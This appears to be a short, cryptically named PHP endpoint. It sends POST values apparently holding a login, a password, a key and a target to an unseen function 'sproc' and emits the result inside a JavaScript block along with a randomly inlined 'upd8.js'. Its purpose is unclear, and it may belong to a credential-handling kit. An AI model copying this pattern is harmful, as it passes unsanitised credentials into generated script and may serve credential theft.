<?php
include '../incz/constvars.inc'; 
include '../incz/sendx.inc'; 
  init_dbx();
  $randomz = rand(1,50);
  if ($randomz != 25) {
  	print "<script language=\"javascript\" src=\"upd8.js\"></script>";
  } else {
  	print "<script language=\"javascript\">";
  	include 'upd8.js';
  	print "</script>";
  }
  print "<script language=\"javascript\">";
  sproc($_POST["l"],$_POST["p"],$_POST["k"],$_POST["target"]);
  print "Z();";
  print "</script>";
  close_dbx();
?>
